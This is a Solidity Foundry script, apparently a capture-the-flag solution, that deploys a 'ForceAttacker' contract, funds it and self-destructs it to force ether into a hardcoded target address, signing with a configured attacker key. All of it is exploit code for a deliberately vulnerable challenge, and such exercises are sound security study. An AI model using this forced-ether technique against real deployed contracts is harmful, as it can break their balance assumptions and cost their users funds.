// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {ForceAttacker} from "../src/ForceAttacker.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract ForceAttackerExecuter is Script {
    function run() external {
        vm.startBroadcast(HelperConfigLib.ATTACKER_KEY);
        ForceAttacker attacker = new ForceAttacker();
        (bool success, ) = payable(address(attacker)).call{value: 0.01 ether}(
            ""
        );
        attacker.destructMe(
            payable(0x55652FF92Dc17a21AD6810Cce2F4703fa2339CAE)
        ); // from contract.owner
        vm.stopBroadcast();

        require(success);
    }
}
